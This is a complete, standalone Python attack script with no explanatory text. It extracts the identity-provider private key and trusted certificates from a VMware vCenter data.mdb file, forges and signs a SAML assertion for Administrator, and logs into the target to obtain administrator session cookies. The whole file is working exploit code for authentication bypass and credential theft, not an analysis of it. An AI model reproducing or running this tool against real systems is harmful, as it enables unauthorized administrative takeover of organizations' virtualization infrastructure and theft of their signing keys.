#!/usr/bin/env python3
import argparse
import base64
import bitstring
import sys
import zlib
from string import printable
from urllib.parse import parse_qs, quote, unquote, urlparse

import socket
import ssl
import OpenSSL.crypto as crypto

import ldap
import lxml.etree as etree
import requests
import urllib3
import xmlsec
from datetime import datetime
from dateutil.relativedelta import relativedelta
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

session = requests.Session()

idp_key_flag = b'\x30\x82'
trusted_cert1_flag1 = b'\x63\x6e\x3d\x54\x72\x75\x73\x74\x65\x64\x43\x65\x72\x74\x43\x68\x61\x69\x6e\x2d\x31\x2c\x63\x6e\x3d\x54\x72\x75\x73\x74\x65\x64\x43\x65\x72\x74\x69\x66\x69\x63\x61\x74\x65\x43\x68\x61\x69\x6e\x73\x2c' # cn=TrustedCertChain-1,cn=TrustedCertificateChains,
trusted_cert1_flag2 = b'\x63\x6e\x3d\x54\x72\x75\x73\x74\x65\x64\x43\x65\x72\x74\x43\x68\x61\x69\x6e\x2d\x32\x2c\x63\x6e\x3d\x54\x72\x75\x73\x74\x65\x64\x43\x65\x72\x74\x69\x66\x69\x63\x61\x74\x65\x43\x68\x61\x69\x6e\x73\x2c' # cn=TrustedCertChain-2,cn=TrustedCertificateChains,
trusted_cert1_flag3 = idp_key_flag
trusted_cert2_flag1 = b'\x01\x00\x12\x54\x72\x75\x73\x74\x65\x64\x43\x65\x72\x74\x43\x68\x61\x69\x6e\x2d\x31' # \x01\x00\x12TrustedCertChain-1
trusted_cert2_flag2 = b'\x01\x00\x12\x54\x72\x75\x73\x74\x65\x64\x43\x65\x72\x74\x43\x68\x61\x69\x6e\x2d\x32' # \x01\x00\x12TrustedCertChain-2
not_it_list = [b'Engineering', b'California', b'object']

SAML_TEMPLATE = \
r"""<?xml version="1.0" encoding="UTF-8"?>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol" Destination="https://$VCENTER_IP/ui/saml/websso/sso" ID="_eec012f2ebbc1f420f3dd0961b7f4eea" InResponseTo="$ID" IssueInstant="$ISSUEINSTANT" Version="2.0">
  <saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">https://$VCENTER/websso/SAML2/Metadata/$DOMAIN</saml2:Issuer>
  <saml2p:Status>
    <saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
    <saml2p:StatusMessage>Request successful</saml2p:StatusMessage>
  </saml2p:Status>
  <saml2:Assertion xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" ID="_91c01d7c-5297-4e53-9763-5ef482cb6184" IssueInstant="$ISSUEINSTANT" Version="2.0">
    <saml2:Issuer Format="urn:oasis:names:tc:SAML:2.0:nameid-format:entity">https://$VCENTER/websso/SAML2/Metadata/$DOMAIN</saml2:Issuer>
    <saml2:Subject>
      <saml2:NameID Format="http://schemas.xmlsoap.org/claims/UPN">Administrator@$DOMAIN</saml2:NameID>
      <saml2:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <saml2:SubjectConfirmationData InResponseTo="$ID" NotOnOrAfter="$NOT_AFTER" Recipient="https://$VCENTER/ui/saml/websso/sso"/>
      </saml2:SubjectConfirmation>
    </saml2:Subject>
    <saml2:Conditions NotBefore="$NOT_BEFORE" NotOnOrAfter="$NOT_AFTER">
      <saml2:ProxyRestriction Count="10"/>
      <saml2:Condition xmlns:rsa="http://www.rsa.com/names/2009/12/std-ext/SAML2.0" Count="10" xsi:type="rsa:RenewRestrictionType"/>
      <saml2:AudienceRestriction>
        <saml2:Audience>https://$VCENTER/ui/saml/websso/metadata</saml2:Audience>
      </saml2:AudienceRestriction>
    </saml2:Conditions>
    <saml2:AuthnStatement AuthnInstant="$ISSUEINSTANT" SessionIndex="_50082907a3b0a5fd4f0b6ea5299cf2ea" SessionNotOnOrAfter="$NOT_AFTER">
      <saml2:AuthnContext>
        <saml2:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml2:AuthnContextClassRef>
      </saml2:AuthnContext>
    </saml2:AuthnStatement>
    <saml2:AttributeStatement>
      <saml2:Attribute FriendlyName="Groups" Name="http://rsa.com/schemas/attr-names/2009/01/GroupIdentity" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
        <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\Users</saml2:AttributeValue>
        <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\Administrators</saml2:AttributeValue>
        <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\CAAdmins</saml2:AttributeValue>
        <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\ComponentManager.Administrators</saml2:AttributeValue>
        <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\SystemConfiguration.BashShellAdministrators</saml2:AttributeValue>
        <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\SystemConfiguration.Administrators</saml2:AttributeValue>
        <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\LicenseService.Administrators</saml2:AttributeValue>
        <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\Everyone</saml2:AttributeValue>
      </saml2:Attribute>
      <saml2:Attribute FriendlyName="userPrincipalName" Name="http://schemas.xmlsoap.org/claims/UPN" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
        <saml2:AttributeValue xsi:type="xsd:string">Administrator@$DOMAIN</saml2:AttributeValue>
      </saml2:Attribute>
      <saml2:Attribute FriendlyName="Subject Type" Name="http://vmware.com/schemas/attr-names/2011/07/isSolution" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
        <saml2:AttributeValue xsi:type="xsd:string">false</saml2:AttributeValue>
      </saml2:Attribute>
      <saml2:Attribute FriendlyName="surname" Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/surname" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
        <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN</saml2:AttributeValue>
      </saml2:Attribute>
      <saml2:Attribute FriendlyName="givenName" Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/givenname" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
        <saml2:AttributeValue xsi:type="xsd:string">Administrator</saml2:AttributeValue>
      </saml2:Attribute>
    </saml2:AttributeStatement>
  </saml2:Assertion>
</saml2p:Response>
"""


def writepem(bytes, verbose):
    data = base64.encodebytes(bytes).decode("utf-8").rstrip()
    cert = "-----BEGIN CERTIFICATE-----\n" + data + "\n-----END CERTIFICATE-----"
    if verbose:
        print('[*] Extracted Trusted certificate:')
        print(cert + '\n')

    return cert

    
def writekey(bytes, verbose):
    data = base64.encodebytes(bytes).decode("utf-8").rstrip()
    key = "-----BEGIN PRIVATE KEY-----\n" + data + "\n-----END PRIVATE KEY-----"
    if verbose:
        print('[*] Extracted a candidate for the IdP key:')
        print(key + '\n')
    
    return key


def check_key_valid(key_bytes, verbose=False):
    """
    PKCS keys begin with the following hex structure
    30 82 ?? ?? 02 01 00
    """
    if key_bytes.startswith(b"0\x82") and key_bytes[4:7] == b"\x02\x01\x00":
        return True
    else:
        if verbose:
            print("[!] Key does not begin with magic bytes")
        return False


def check_cert_valid(cert_bytes, verbose=False):
    """
    x509 certs begin with the following hex structure
    30 82 ?? ?? 30 82
    """
    if cert_bytes.startswith(b"0\x82") and cert_bytes[4:6] == b"0\x82":
        return True
    else:
        if verbose:
            print("[!] Certificate does not begin with magic bytes")
        return False


def check_cert_root_ca(cert_bytes, verbose=False):
    cert = crypto.load_certificate(crypto.FILETYPE_PEM, cert_bytes)
    for ext in cert.get_extensions():
        short_name = ext.get_short_name()
        if short_name == b'basicConstraints':
            if 'CA:TRUE' in str(ext):
                return True
            break

    if verbose:
        print("[!] Certificate is not a root certificate")
    return False


def check_private_key_matches_cert(private_key_str, cert_str):
    try:
        private_key = crypto.load_privatekey(crypto.FILETYPE_PEM, private_key_str)
        cert = crypto.load_certificate(crypto.FILETYPE_PEM, cert_str)

        pkey_pub = crypto.dump_publickey(crypto.FILETYPE_PEM, private_key)
        cert_pub = crypto.dump_publickey(crypto.FILETYPE_PEM, cert.get_pubkey())

        return pkey_pub == cert_pub
    except crypto.Error:
        return False


def get_idp_key_candidates(stream, verbose=False):
    tup = stream.findall(idp_key_flag, bytealigned=True)
    matches = list(tup)
    keys = []
    for match in matches:
        stream.pos = match - 16
        size_hex = stream.read('bytes:2')
        size = int(size_hex.hex(), 16)
        try:
            key_bytes = stream.read(f'bytes:{size}')
        except bitstring.ReadError:
            continue
        if any(not_it in key_bytes for not_it in not_it_list):
            continue

        if not check_key_valid(key_bytes):
            continue

        print('[*] Found a candidate for the IdP key') 
        key = writekey(key_bytes, verbose)
        keys.append(key)
    if keys:
        return keys

    print(f'[-] Failed to find the IdP key')
    sys.exit()


def get_idp_key(idp_key_candidates, trusted_cert1, verbose=False):
    for candidate in idp_key_candidates:
        if check_private_key_matches_cert(candidate, trusted_cert1):
            print('[*] Successfully extracted the IdP key')
            if verbose:
                print(candidate)
            return candidate

    print('[-] Failed to extract the IdP key')
    sys.exit()


def get_domain_from_cn(cn):
    parts = cn.split(',')
    domain_parts = []
    for part in parts:
        if part.lower().startswith('dc='):
            domain_parts.append(part[3:])
    domain = '.'.join(domain_parts).strip()
    domain = ''.join(char for char in domain if char in printable)
    return domain


def get_trusted_cert1_pem(stream, verbose=False):
    # Get TrustedCertificate1 pem 1
    cert1_size_hex = stream.read('bytes:2')
    cert1_size = int(cert1_size_hex.hex(), 16)
    cert1_bytes = stream.read(f'bytes:{cert1_size}')
    if verbose:
        print(f'[!] Cert 1 size: {cert1_size}')

    if b'ssoserverSign' not in cert1_bytes:
        if verbose:
            print('[!] Cert does not contain ssoserverSign - keep looking')
        return 

    if not check_cert_valid(cert1_bytes):
        return 
    cert1 = writepem(cert1_bytes, verbose)

    print('[*] Successfully extracted trusted certificate 1')
    return cert1


def get_trusted_cert1(stream, domain_lookup=True, verbose=False):
    if domain_lookup:
        for trusted_cert1_flag in [trusted_cert1_flag1, trusted_cert1_flag2]:
            tup = stream.findall(trusted_cert1_flag)
            matches = list(tup)
            if matches:
                for match in matches:
                    stream.pos = match
                    if verbose:
                        print(f'[!] Looking for cert 1 at position: {match}')

                    cn_end = stream.readto('0x000013', bytealigned=True)
                    cn_end_pos = stream.pos
                    if verbose:
                        print(f'[!] CN end position: {cn_end_pos}')

                    stream.pos = match
                    cn_len = int((cn_end_pos - match - 8) / 8)
                    try:
                        cn = stream.read(f'bytes:{cn_len}').decode()
                    except UnicodeDecodeError:
                        continue
                    domain = get_domain_from_cn(cn)
                    if domain:
                        print(f'[*] CN: {cn}')
                        print(f'[*] Domain: {domain}')
                    else:
                        print(f'[!] Failed parsing domain from CN')
                        sys.exit()

                    stream.readto(f'0x0002', bytealigned=True)
                    cert1 = get_trusted_cert1_pem(stream, verbose)
                    if cert1 is not None:
                        return cert1, domain
    else:
        tup = stream.findall(trusted_cert1_flag3)
        matches = list(tup)
        if matches:
            for match in matches:
                stream.pos = match - 16
                cert1 = get_trusted_cert1_pem(stream, verbose)
                if cert1 is not None:
                    return cert1
    print(f'[-] Failed to find the trusted certificate 1')


def get_trusted_cert2(stream, verbose=False):
    # Get TrustedCertificate1 pem2
    for trusted_cert2_flag in [trusted_cert2_flag1, trusted_cert2_flag2]:
        tup = stream.findall(trusted_cert2_flag)
        matches = list(tup)
        for match in matches:
            stream.pos = match - 10240

            try:
                start = stream.readto('0x3082', bytealigned=True)
            except:
                print('Failed finding cert 2')
                sys.exit()

            stream.pos = stream.pos - 32
            cert2_size_hex = stream.read('bytes:2')
            cert2_size = int(cert2_size_hex.hex(), 16)
            cert2_bytes = stream.read(f'bytes:{cert2_size}')
            if verbose:
                print(f'Cert 2 Size: {cert2_size}')

            if not check_cert_valid(cert2_bytes, verbose) and not check_cert_root_ca(writepem(cert2_bytes), verbose):
                continue

            cert2 = writepem(cert2_bytes, verbose)

            print('[*] Successfully extracted trusted certificate 2')
            return cert2

    print(f'[-] Failed to find the trusted cert 2')
    sys.exit()

def saml_request(vcenter):
    """Get SAML AuthnRequest from vCenter web UI"""
    try:
        print(f'[*] Initiating SAML request with {vcenter}')
        r = session.get(f"https://{vcenter}/ui/login", allow_redirects=False, verify=False)
        if r.status_code != 302:
            raise Exception("expected 302 redirect")
        o = urlparse(r.headers["location"])
        sr = parse_qs(o.query)["SAMLRequest"][0]
        dec = base64.decodebytes(sr.encode("utf-8"))
        req = zlib.decompress(dec, -8)
        return etree.fromstring(req), parse_qs(o.query)["RelayState"][0]
    except:
        print(f'[-] Failed initiating SAML request with {vcenter}')
        raise


def fill_template(vcenter_hostname, vcenter_ip, vcenter_domain, req):
    """Fill in the SAML response template"""
    try:
        print('[*] Generating SAML assertion') 
        # Generate valid timestamps
        before = (datetime.today() + relativedelta(months=-1)).isoformat()[:-3]+'Z'
        after = (datetime.today() + relativedelta(months=1)).isoformat()[:-3]+'Z'

        # Replace fields dynamically
        t = SAML_TEMPLATE
        t = t.replace("$VCENTER_IP", vcenter_ip)
        t = t.replace("$VCENTER", vcenter_hostname)
        t = t.replace("$DOMAIN", vcenter_domain)
        t = t.replace("$ID", req.get("ID"))
        t = t.replace("$ISSUEINSTANT", req.get("IssueInstant"))
        t = t.replace("$NOT_BEFORE", before)
        t = t.replace("$NOT_AFTER", after)
        return etree.fromstring(t.encode("utf-8"))
    except:
        print('[-] Failed generating the SAML assertion')
        raise

def sign_assertion(root, cert1, cert2, key):
    """Sign the SAML assertion in the response using the IdP key"""
    try:
        print('[*] Signing the SAML assertion')
        assertion = root.find("{urn:oasis:names:tc:SAML:2.0:assertion}Assertion")
        assertion_id = assertion.get("ID")
   
        ctx = xmlsec.SignatureContext()
        ctx.key = xmlsec.Key.from_memory(key, xmlsec.KeyFormat.PEM)
        ctx.key.load_cert_from_memory(cert1, xmlsec.KeyFormat.PEM)
        ctx.key.load_cert_from_memory(cert2, xmlsec.KeyFormat.PEM)
 
        sign_node = xmlsec.template.create(root, xmlsec.Transform.EXCL_C14N, xmlsec.Transform.RSA_SHA256, ns="ds")
        assertion.insert(1, sign_node)
        
        ref = xmlsec.template.add_reference(sign_node, xmlsec.Transform.SHA256, uri=f"#{assertion_id}")
        xmlsec.template.add_transform(ref, xmlsec.Transform.ENVELOPED)
        
        exc_c14n_transform = xmlsec.template.add_transform(ref, xmlsec.Transform.EXCL_C14N)
        inclusive_ns = etree.SubElement(
            exc_c14n_transform,
            f"{{{xmlsec.Transform.EXCL_C14N.href}}}InclusiveNamespaces",
            nsmap={"ec": xmlsec.Transform.EXCL_C14N.href}
        )
        inclusive_ns.set("PrefixList", "xsd xsi")

        key_info = xmlsec.template.ensure_key_info(sign_node)
        xmlsec.template.add_x509_data(key_info)
       
        # Remove the line feeds that break the signature
        parser = etree.XMLParser(remove_blank_text=True)
        root_str = etree.tostring(root)
        root = etree.XML(root_str, parser=parser)

        sign_node = xmlsec.tree.find_node(root, xmlsec.Node.SIGNATURE)
        assertion = root.find("{urn:oasis:names:tc:SAML:2.0:assertion}Assertion")
        ctx.register_id(node=assertion, id_attr="ID")
        ctx.sign(sign_node)

        return root
    except:
        print('[-] Failed signing the SAML assertion')
        raise

def login(vcenter, saml_resp, relaystate):
    """Log in to the vCenter web UI using the signed response and return a session cookie"""
    try:
        print('[*] Attempting to log into vCenter with the signed SAML request')
        resp = etree.tostring(saml_resp, xml_declaration=True, encoding="UTF-8", pretty_print=False)

        if relaystate == None:
            data = {"SAMLResponse": base64.encodebytes(resp)}
        else:
            data = {"SAMLResponse": base64.encodebytes(resp), "RelayState":relaystate}

        r = session.post(
            f"https://{vcenter}/ui/saml/websso/sso",
            allow_redirects=False,
            verify=False,
            data=data,
        )
        if r.status_code != 302:
            raise Exception("expected 302 redirect")
        cookies = r.headers["Set-Cookie"].split(",")
        print(f'[+] Successfuly obtained Administrator cookies for {vcenter}!')
        print(f'[+] Cookies:')
        for cookie in cookies:
            print("\t" + cookie.lstrip())
    except:
        print('[-] Failed logging in with SAML request')
        raise


def get_hostname(vcenter):
    try:
        print('[*] Obtaining hostname from vCenter SSL certificate')
        dst = (vcenter, 443)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(dst)
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname=dst[0])

        # get certificate
        cert_bin = s.getpeercert(True)
        x509 = crypto.load_certificate(crypto.FILETYPE_ASN1,cert_bin)
        hostname = x509.get_subject().CN
        print(f'[*] Found hostname {hostname} for {vcenter}')
        return hostname
    except:
        print('[-] Failed obtaining hostname from SSL certificates for {vcenter}')
        raise


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-p', '--path', help='The path to the data.mdb file', required=True)
    parser.add_argument('-t', '--target', help='The IP address of the target', required=True)
    parser.add_argument('-d', '--domain', help='vCenter SSO domain')
    parser.add_argument('-v', '--verbose', action='store_true', help='Print the extracted certificates and private key')
    args = parser.parse_args()

    # Extract certificates and private key
    in_stream = open(args.path, 'rb')
    bin_stream = bitstring.ConstBitStream(in_stream)
    idp_key_candidates = get_idp_key_candidates(bin_stream, args.verbose)

    if args.domain is None:
        trusted_cert_1, domain = get_trusted_cert1(bin_stream, domain_lookup=True, verbose=args.verbose)
    else:
        trusted_cert_1 = get_trusted_cert1(bin_stream, domain_lookup=False, verbose=args.verbose)
        domain = args.domain

    idp_key = get_idp_key(idp_key_candidates, trusted_cert_1, args.verbose)
    trusted_cert_2 = get_trusted_cert2(bin_stream, args.verbose)

    # Generate SAML request
    hostname = get_hostname(args.target)
    req, relaystate = saml_request(args.target)
    t = fill_template(hostname, args.target, domain,req)
    s = sign_assertion(t, trusted_cert_1, trusted_cert_2, idp_key)
    c = login(args.target, s, relaystate)

